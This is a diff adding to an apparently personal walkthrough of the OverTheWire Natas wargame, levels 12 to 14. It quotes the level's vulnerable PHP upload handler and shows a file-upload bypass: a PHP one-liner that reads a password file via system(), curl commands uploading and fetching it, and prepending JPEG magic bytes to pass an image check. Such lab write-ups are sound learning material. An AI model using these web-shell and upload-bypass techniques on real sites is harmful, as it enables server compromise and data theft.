@@ -203,3 +203,87 @@ type the following (or whatever cookie is pertinent to the situation)
 document.cookie = "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK";
 
 then refresh
+
+
+12 -> 13
+
+```php
+<? 
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+```
+
+One thing that stuck out is that genRandomString() is called twice. First initially in the hidden input part of the form, then by makeRandomPath(). That stood out as odd. It was not immediately evident where the next passcode was. But if you follow the chain (`if array_key_exists("filename",$_POST)...` that filename (which is the first randomly generated one) is passed through. Most particularly that extension is passed through. This means it doesn't matter what filetype is uploaded, it will take on that random string and appended ".jpg" file extension.
+
+Anyway, this code just appears to check that filename exists (which is true after a file is chosen) then it generates a different random string and appends that .jpg to it as described above, so even if you choose to upload a php script, it won't be executed (I assume the browser is reliant on that file extension).
+
+My strategy was to upload my php script (`<?php system('cat /etc/natas_webpass/natas13'); ?>` ) then before clicking submit, opening up the dev tools and changing the 1st rando file extension to ".php". Admittedly, I didn't fully figure this out on my own.
+
+my friend did the same with this curl command:
+```sh
+curl 'http://natas12.natas.labs.overthewire.org/index.php' \
+  -X 'POST' \
+  -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==' \
+  -H 'Content-Type: multipart/form-data' \
+  -F 'filename=whatever.php' \
+  -F 'uploadedfile=@get_pass.php;' \
+```
+
+From here visit the site or be cool and get it with curl again (don't forget to add te authorization block)
+
+`curl http://natas12.natas.labs.overthewire.org/upload/imx0qbstyu.php -H 'Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw=='`
+
+13 -> 14
+
+The same except it has a line to check filetype. The php that accomplishes this is
+```php 
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+```
+The way this appears to work is by checking the "magic" hex codes in the front which indicate filetype. [There are many](https://en.wikipedia.org/wiki/List_of_file_signatures),here's one for jpg: `FF D8 FF EE`. A command line tool called simply `hexeditor` can be used to add these 4 to the front (`hexeditor -b <file>` to open in buffer mode from which new byes can be added with ctrl-A)
